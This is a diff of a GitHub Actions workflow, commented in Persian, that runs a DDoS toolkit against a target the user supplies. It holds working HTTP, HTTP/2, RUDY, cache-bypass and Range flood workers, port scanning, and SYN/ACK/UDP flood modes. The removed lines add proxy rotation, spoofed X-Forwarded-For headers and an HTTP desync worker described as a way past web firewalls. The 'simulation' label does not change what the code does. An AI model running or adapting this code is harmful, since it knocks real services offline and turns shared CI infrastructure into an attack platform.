@@ -1,4 +1,4 @@
-name: Ultimate DDoS Simulation Toolkit (War Mode)
+name: Ultimate DDoS Simulation Toolkit
 
 on:
   workflow_dispatch:
@@ -15,7 +15,6 @@ on:
           - l7_rudy_flood
           - l7_cache_bypass
           - l7_range_flood
-          - l7_desync_flood
           - l4_syn_flood
           - l4_ack_flood
           - l4_udp_flood
@@ -34,7 +33,7 @@ on:
       threads:
         description: 'تعداد نخ‌ها'
         required: true
-        default: '500'
+        default: '300'
 
 permissions:
   contents: write
@@ -53,38 +52,11 @@ jobs:
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
 
-      - name: کش کردن بسته‌های APT
-        uses: actions/cache@v4
-        with:
-          path: /var/cache/apt/archives
-          key: ${{ runner.os }}-apt-${{ hashFiles('.github/workflows/toolkit.yml') }}
-          restore-keys: |
-            ${{ runner.os }}-apt-
-
-      - name: کش کردن pip
-        uses: actions/cache@v4
-        with:
-          path: ~/cache/pip
-          key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}
-          restore-keys: |
-            ${{ runner.os }}-pip-
-
-      - name: کش کردن نتایج اسکن
-        uses: actions/cache@v4
-        with:
-          path: scan_results
-          key: scan-cache-${{ runner.os }}-${{ hashFiles('scan_results/targets_cache.json') }}
-          restore-keys: |
-            scan-cache-${{ runner.os }}-
-
-      - name: نصب بسته‌های سیستمی
+      - name: نصب ابزارها
         run: |
           sudo apt-get update
-          sudo apt-get install --no-download -y nmap 2>/dev/null || sudo apt-get install -y nmap
-
-      - name: نصب بسته‌های پایتون
-        run: |
-          pip3 install --cache-dir ~/cache/pip aiohttp rich "httpx[http2]" websockets scapy python-nmap aiodns
+          sudo apt-get install -y nmap
+          pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap
 
       - name: اجرای حمله
         env:
@@ -146,30 +118,19 @@ jobs:
                   elapsed = time.time() - stats['start_time']
                   return {'sent': stats['sent'], 'success': stats['success'], 'failed': stats['failed'], 'elapsed': elapsed, 'rps': stats['sent'] / elapsed if elapsed > 0 else 0}
 
-          # DNS-over-HTTPS resolver using aiodns
-          try:
-              import aiodns
-              DNS_RESOLVER = aiodns.DNSResolver(nameservers=['1.1.1.1', '8.8.8.8'])
-              async def async_resolve(host):
-                  result = await DNS_RESOLVER.gethostbyname(host, socket.AF_INET)
-                  return result.addresses[0]
-          except:
-              DNS_RESOLVER = None
-              async def async_resolve(host):
-                  return socket.gethostbyname(host)
-
           def resolve_target(target):
               for prefix in ['https://', 'http://']:
                   if target.startswith(prefix): target = target[len(prefix):]
               target = target.split('/')[0].split(':')[0]
               try:
-                  return asyncio.run(async_resolve(target))
+                  addrs = socket.getaddrinfo(target, None, socket.AF_INET, socket.SOCK_STREAM)
+                  return addrs[0][4][0]
               except:
                   return None
 
           COMMON_HTTP_PORTS = [80, 443, 8080, 8443, 3000, 8000, 9000, 5000, 4000, 4443]
 
-          def check_port(ip, port, timeout=0.3):
+          def check_port(ip, port, timeout=0.5):
               try:
                   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                   sock.settimeout(timeout)
@@ -181,7 +142,7 @@ jobs:
 
           def fast_http_scan(ip):
               open_ports = []
-              with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+              with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
                   future_to_port = {executor.submit(check_port, ip, port): port for port in COMMON_HTTP_PORTS}
                   for future in concurrent.futures.as_completed(future_to_port):
                       port = future_to_port[future]
@@ -256,81 +217,40 @@ jobs:
           ]
           def get_random_path(): return random.choice(RANDOM_PATHS)
 
-          # ===== 1. ماژول پیشرفته مدیریت پروکسی =====
-          PROXIES = []
-          def init_proxies():
-              global PROXIES
-              local_file = "proxies.txt"
-              if os.path.exists(local_file):
-                  try:
-                      with open(local_file, "r") as f:
-                          PROXIES = [line.strip() for line in f if line.strip()]
-                      console.print(f"[green]✅ {len(PROXIES)} پروکسی از فایل محلی بارگذاری شد.[/green]")
-                      return
-                  except:
-                      pass
-              console.print("[yellow]⚠️ فایل پروکسی محلی یافت نشد. حمله با IP مستقیم ادامه می‌یابد.[/yellow]")
-
-          def get_random_proxy():
-              if PROXIES:
-                  return random.choice(PROXIES)
-              return None
-
-          # ===== 2. کارگرهای جنگی (حداکثر سرعت، بدون sleep، با پروکسی و DNS-over-HTTPS) =====
+          # ===== کارگرهای جدید با پشتیبانی از stop_event =====
           async def http_worker(url, worker_id):
-              connector = aiohttp.TCPConnector(limit=0, force_close=False, ttl_dns_cache=60)
+              connector = aiohttp.TCPConnector(limit=0, force_close=False)
               async with aiohttp.ClientSession(connector=connector) as session:
                   while not stop_event.is_set():
-                      proxy = get_random_proxy()
                       headers = {
                           "User-Agent": get_random_ua(),
                           "Accept": "*/*",
-                          "Accept-Language": random.choice(["en-US,en;q=0.9","fr;q=0.8","de;q=0.7"]),
+                          "Accept-Language": random.choice(["en-US,en;q=0.9", "fr;q=0.8", "de;q=0.7"]),
                           "Cache-Control": "no-cache",
                           "Connection": "keep-alive",
-                          "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
                       }
                       try:
-                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=4, proxy=proxy) as r:
+                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5) as r:
                               increment('sent')
                               if r.status < 500: increment('success')
                               else: increment('failed')
                       except:
                           increment('sent'); increment('failed')
-                      await asyncio.sleep(0)
+                      await asyncio.sleep(0.0001)
 
           async def http2_worker(url, worker_id):
               import httpx
-              async with httpx.AsyncClient(http2=True, verify=False, timeout=4.0) as client:
+              async with httpx.AsyncClient(http2=True, verify=False, timeout=5.0) as client:
                   while not stop_event.is_set():
-                      proxy = get_random_proxy()
                       headers = {"User-Agent": get_random_ua(), "Accept": "*/*"}
                       try:
-                          r = await client.get(url.rstrip('/') + get_random_path(), headers=headers, proxy=proxy)
+                          r = await client.get(url.rstrip('/') + get_random_path(), headers=headers)
                           increment('sent')
                           if r.status_code < 500: increment('success')
                           else: increment('failed')
                       except:
                           increment('sent'); increment('failed')
-                      await asyncio.sleep(0)
-
-          # HTTP Desync (تکنیک پیشرفته دور زدن WAF)
-          async def desync_worker(url, worker_id):
-              parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
-              host = parsed.split(':')[0]
-              port = 443 if 'https' in url else 80
-              while not stop_event.is_set():
-                  try:
-                      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                      sock.settimeout(4)
-                      sock.connect((host, port))
-                      raw_req = f"GET {get_random_path()} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n"
-                      sock.send(raw_req.encode())
-                      sock.close()
-                      increment('sent'); increment('success')
-                  except:
-                      increment('sent'); increment('failed')
-                  await asyncio.sleep(0.0001)
+                      await asyncio.sleep(0.0001)
 
           async def rudy_worker(url, worker_id):
               parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
@@ -353,9 +273,9 @@ jobs:
                       await asyncio.sleep(1)
 
           async def cache_bypass_worker(url, worker_id):
-              async with aiohttp.ClientSession() as session:
+              connector = aiohttp.TCPConnector(limit=0, force_close=False)
+              async with aiohttp.ClientSession(connector=connector) as session:
                   while not stop_event.is_set():
-                      proxy = get_random_proxy()
                       params = {f"cachebuster_{random.randint(1000,9999)}": random.randint(100000, 999999) for _ in range(random.randint(3,8))}
                       headers = {
                           "User-Agent": get_random_ua(),
@@ -364,31 +284,31 @@ jobs:
                           "Vary": "User-Agent",
                       }
                       try:
-                          async with session.get(url.rstrip('/') + get_random_path(), params=params, headers=headers, timeout=5, proxy=proxy) as r:
+                          async with session.get(url.rstrip('/') + get_random_path(), params=params, headers=headers, timeout=5) as r:
                               increment('sent')
                               if r.status < 500: increment('success')
                               else: increment('failed')
                       except:
                           increment('sent'); increment('failed')
-                      await asyncio.sleep(0)
+                      await asyncio.sleep(0.001)
 
           async def range_worker(url, worker_id):
-              async with aiohttp.ClientSession() as session:
+              connector = aiohttp.TCPConnector(limit=0, force_close=False)
+              async with aiohttp.ClientSession(connector=connector) as session:
                   while not stop_event.is_set():
-                      proxy = get_random_proxy()
                       headers = {
                           "User-Agent": get_random_ua(),
                           "Range": f"bytes={random.randint(0,1024)}-{random.randint(1025,1048576)}",
                           "Accept-Encoding": "identity",
                       }
                       try:
-                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5, proxy=proxy) as r:
+                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5) as r:
                               increment('sent')
                               if r.status < 500: increment('success')
                               else: increment('failed')
                       except:
                           increment('sent'); increment('failed')
-                      await asyncio.sleep(0)
+                      await asyncio.sleep(0.001)
 
           async def mixed_worker(url, worker_id):
               while not stop_event.is_set():
@@ -481,9 +401,6 @@ jobs:
               sys.exit(1)
           console.print(f"🎯 IP هدف: [bold cyan]{ip}[/bold cyan]")
 
-          # === راه‌اندازی پروکسی‌ها ===
-          init_proxies()
-
           target_ports = None
           cached_ports = get_cached_scan(ip)
           if cached_ports is not None and PORT_ARG == 'auto':
@@ -533,10 +450,6 @@ jobs:
               elif ATTACK == 'l7_range_flood':
                   for _ in range(THREADS):
                       t = threading.Thread(target=run_async_flood, args=(range_worker, base_url, 4))
-                      t.daemon = True; t.start()
-              elif ATTACK == 'l7_desync_flood':
-                  for _ in range(THREADS):
-                      t = threading.Thread(target=run_async_flood, args=(desync_worker, base_url, 4))
                       t.daemon = True; t.start()
               elif ATTACK == 'l4_syn_flood':
                   for _ in range(THREADS):
